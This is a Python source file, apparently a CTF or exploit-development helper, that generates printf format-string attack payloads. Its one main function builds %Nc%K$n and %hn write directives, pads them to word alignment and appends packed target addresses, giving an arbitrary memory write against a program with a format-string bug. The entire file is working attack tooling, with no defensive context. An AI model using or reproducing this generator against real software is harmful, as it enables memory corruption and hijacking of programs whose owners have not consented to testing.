import math
import struct


def get_keys(d, value):
    return [k for k,v in d.items() if v == value]

def pack64(n):
    return struct.pack("<Q", n)

def pack32(n):
    return struct.pack("I", n)

def payload(offset,write_addr,write_size=4,x64=1):
    v = [v for v in sorted(write_addr.values())]
    # print v
    if write_size == 4:
        fmtstr_string = "%{}c%{}$n"
        fmtstr_zero_string = "%{}$n"
        fmtstr_default_len = 5
        fmtstr_default_zero_len = 3
    elif write_size == 2:
        fmtstr_string = "%{}c%{}$hn"
        fmtstr_zero_string = "%{}$hn"
        fmtstr_default_len = 6
        fmtstr_default_zero_len = 4
    if x64==1:
        algin = 8
        pack = pack64
    else:
        algin = 4
        pack = pack32
    print_len = 0
    fmtstr_len = 0
    
    may_offset_add = 0
    pre_fmtstr_may_len = 0
    fmtstr_result = ""
    while True:
        fmtstr_may_len = 0 
        print_len = 0
        for i in range(len(v)):
            will_write = v[i] - print_len
            print_len = v[i]
            if will_write == 0:
                fmtstr_may_len += fmtstr_default_zero_len
            else:
                fmtstr_may_len += fmtstr_default_len
                fmtstr_may_len += len(str(will_write))
            fmtstr_may_len += len(str(offset+i+may_offset_add))
        if pre_fmtstr_may_len !=0 :
            if int(math.ceil(fmtstr_may_len/(algin*1.0))) == may_offset_add:
                break
            pass
        pre_fmtstr_may_len = fmtstr_may_len
        may_offset_add = int(math.ceil(fmtstr_may_len/(algin*1.0)))
    print_len = 0
    for i in range(len(v)):
        will_write = v[i] - print_len
        print_len = v[i]
        if will_write == 0:
            fmtstr_result += fmtstr_zero_string.format(offset+i+may_offset_add)
        else:
            fmtstr_result += fmtstr_string.format(will_write,offset+i+may_offset_add)
    fmtstr_len = len(fmtstr_result)
    fmtstr_result = fmtstr_result.ljust(int(math.ceil(len(fmtstr_result)/(algin*1.0)))*algin,'a')
    fmtstr_len = len(fmtstr_result)
    flag = 0
    for i in range(len(v)):
        addrs = get_keys(write_addr,v[i])
        if len(addrs) == 1:
            flag = 0
            fmtstr_result += pack(addrs[0])
        else:
            fmtstr_result += pack(addrs[flag])
            flag+=1
    return fmtstr_result
